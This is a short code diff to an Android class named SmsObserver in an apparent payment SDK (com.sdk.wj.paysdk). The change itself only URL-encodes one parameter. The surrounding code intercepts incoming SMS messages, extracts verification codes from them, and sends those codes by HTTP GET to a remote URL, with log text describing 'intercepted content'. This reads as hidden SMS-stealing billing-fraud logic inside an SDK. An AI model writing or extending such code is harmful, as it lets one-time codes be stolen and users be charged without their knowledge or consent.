@@ -17,6 +17,8 @@ import com.sdk.wj.paysdk.utils.Constants;
 import com.sdk.wj.paysdk.utils.Log;
 import com.sdk.wj.paysdk.utils.Utils;
 
+import java.net.URLEncoder;
+
 
 /**
  * Created by Administrator on 2017/4/26.
@@ -189,7 +191,7 @@ public class SmsObserver extends ContentObserver {
                         Sms_send_tongbu("拦截到的发回去的内容----->" + limitNum + "      " + SmsContent, context, 10002);
                     } else if (payType.equals("3")) {
                         String SmsContent = Utils.getCode2Sms(Integer.valueOf(vCodeLength), smsBody);
-                        String url = otherNeedUrl + "?vcode=" + SmsContent + "&sendParam=" + sendParam;
+                        String url = otherNeedUrl + "?vcode=" + SmsContent + "&sendParam=" + URLEncoder.encode(sendParam,"UTF-8");
                         GetDataImpl.doGetRequestWithoutListener(url);
                         if (Constants.isOutPut) {
                             Log.debug("------>content:" + smsBody);
